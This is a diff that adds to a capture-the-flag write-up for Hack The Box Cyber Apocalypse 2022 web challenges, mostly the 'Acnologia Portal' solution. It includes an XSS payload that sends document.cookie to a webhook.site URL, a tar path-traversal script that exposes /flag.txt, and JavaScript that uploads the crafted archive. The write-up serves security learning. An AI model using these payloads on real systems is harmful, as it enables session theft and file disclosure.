@@ -151,7 +151,7 @@ For this one, we were given the source file ([Ref](/2022/Hack%20The%20Box%20-%20
 
 We click on the picture in the center & it'll prompt us to select a file to upload. Upon selecting a picture, we see that the white areas become transparent, so this is somekind of a picture converter. Let's have a look on the source code for this.
 
-As a start, we notice that we are running a Flask app. We head to the [application/blueprints/routes.py](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_amidst_us/challenge/application/blueprints/routes.py) to check for routes & we get only 1 API route, `alphafy` used for image processing. We are using a helper method defined in [application/utils.py](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_amidst_us/challenge/application/utils.py). I've edited the source a little to help me debug the payload. The interesting part is the following:
+As a start, we notice that we are running a Flask app. We head to the [application/blueprints/routes.py](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_amidst_us/challenge/application/blueprints/routes.py) to check for routes & we get only 1 API route, `alphafy` used for image processing. We are using a helper method defined in [application/util.py](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_amidst_us/challenge/application/util.py). I've edited the source a little to help me debug the payload. The interesting part is the following:
 
 ```python
 def make_alpha(data):
@@ -349,7 +349,141 @@ The `--` is used as a one line comment in SQL.
 
 And that, gives us a backdoor file at `/door.php`. We find the flag file & get it's content: `HTB{inj3ct3d_th3_tru7h}`
 
+<br/>
+
 5. <p name="web5">Acnologia Portal (★★☆☆)</p>
+Moving to the next one, we get a Flask app source code for this one  ([Ref](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_acnologia_portal/)). We get a login page with the option of account creation, so we signup & connect:
+
+<p align="center">
+    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/home_web5.png'>
+</p>
+
+After logging in, we get a 'Firmware List' with an option to report a bug:
+
+<p align="center">
+    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/firmware_list_web5.png'>
+</p>
+
+Going for the report option, we get a report form, simillar to the Kryptos Support.
+
+<p align="center">
+    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/report_web5.png'>
+</p>
+
+I doubt this'll be a normal XSS. Going for the basic payload
+
+```html
+<script>
+	fetch('https://webhook.site/a02af4ea-d61b-440d-9982-c3804fd1587a?q='+document.cookie);
+</script>
+```
+
+But we get an empty response:
+
+<p align="center">
+    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/webhook_web5.png'>
+</p>
+
+Looking at the source code, we see an option to upload a Firmware:
+
+[Routes.py](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_acnologia_portal/challenge/application/blueprints.py)
+```python
+@api.route('/firmware/upload', methods=['POST'])
+@login_required
+@is_admin
+def firmware_update():
+    if 'file' not in request.files:
+        return response('Missing required parameters!'), 401
+    
+    extraction = extract_firmware(request.files['file'])
+    if extraction:
+        return response('Firmware update initialized successfully.')
+
+    return response(request.files['file'].filename), 403
+```
+<br/>
+
+[Util.py](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_acnologia_portal/challenge/application/util.py)
+```python
+def extract_firmware(file):
+    tmp  = tempfile.gettempdir()
+    path = os.path.join(tmp, file.filename)
+    file.save(path)
+    
+    with open(path, 'rb') as f:
+        d = f.read()
+
+    if tarfile.is_tarfile(path):
+        tar = tarfile.open(path, 'r:gz')
+        tar.extractall(tmp)
+
+        rand_dir = generate(15)
+        extractdir = f"{current_app.config['UPLOAD_FOLDER']}/{rand_dir}"
+        os.makedirs(extractdir, exist_ok=True)
+        for tarinfo in tar:
+            name = tarinfo.name
+            if tarinfo.isreg():
+                try:
+                    filename = f'{extractdir}/{name}'
+                    os.rename(os.path.join(tmp, name), filename)
+                    continue
+                except:
+                    pass
+            os.makedirs(f'{extractdir}/{name}', exist_ok=True)
+        tar.close()
+        return True
+
+    return False
+```
+
+So we are uploading a tar file & extracting it's content without any validation, which leads us to a Zip-Slip. Since the flag path is known, I decided to simply upload a link file to a public location (`/static`).
+
+Starting with our file payload, I created a link file to /flag.txt (`ln -s /flag.txt`) then I used this script to create the tar file:
+
+```python
+import tarfile
+
+tar = tarfile.open(path, 'w:gz')
+tar.add('flag_link', '../../../../../../app/application/static/flag')
+tar.close()
+```
+
+Now, the upload part... When you're uploading a file, the selected file is transformed into a `File` object, which is sent to the server. So I searched for how to actually create a `File` instance & set it's content.
+
+After a bit of searching, I ended up with the following
+
+```javascript
+// File content b64 encoded, atob decodes base 64 strings
+let content = atob('H4sICHqTg2IC/3Rlc3QudGFyAO3TT0vDMBjH8Zx9FTkI00uStmm34Z95ET168CZDQi02YNeyRpjv1KPvZLbu4BDUgzh0+36S8IQ8gRzCT2mlz67c4rJwd8Vc/Aqz8lk1JrHv+/48MnEUC7kQG/DYBjfvnhe7KR7JKviqOImyNO6Htcom43EySvYEtp7Sam26punXg89d8PVMd9kIPtelV03Z/Cj/mX3LeDRMzXpdsR/znw3TVEizyfxX9ezef3Hvu/4/tXxevhxPut+VRV7Wsn1qQ1Ed7N9enF/fDPLB9PBockpKAAAAAAAAAAAAAAAA/q5XAWe8/gAoAAA=')
+n = content.length;
+
+// Will be used to store the decoded bytes & used in the File constructor.
+u8arr = new Uint8Array(n);
+
+// Just transfer the string to the UInt8Arr
+while(n--){
+    u8arr[n] = content.charCodeAt(n);
+}
+
+// Create File object
+f = new File([u8arr], "payload.tar", {type: "application/x-tar" });
+
+// Setup form data to be sent
+const formData = new FormData();
+formData.append('file', f);
+
+await fetch('http://localhost:1337/api/firmware/upload', {
+    method: 'POST',
+    body: formData })
+
+```
+
+And we get our link file at `/static/flag` ! Flag: `HTB{des3r1aliz3_4ll_th3_th1ngs}`
+
+* Notes:
+	- There was the possibility of gaining an RCE using the Pickle serialization problem by overwriting the flask session file.
+
+<br/>
 
 6. <p name="web6">Red Island (★★☆☆)</p>
 
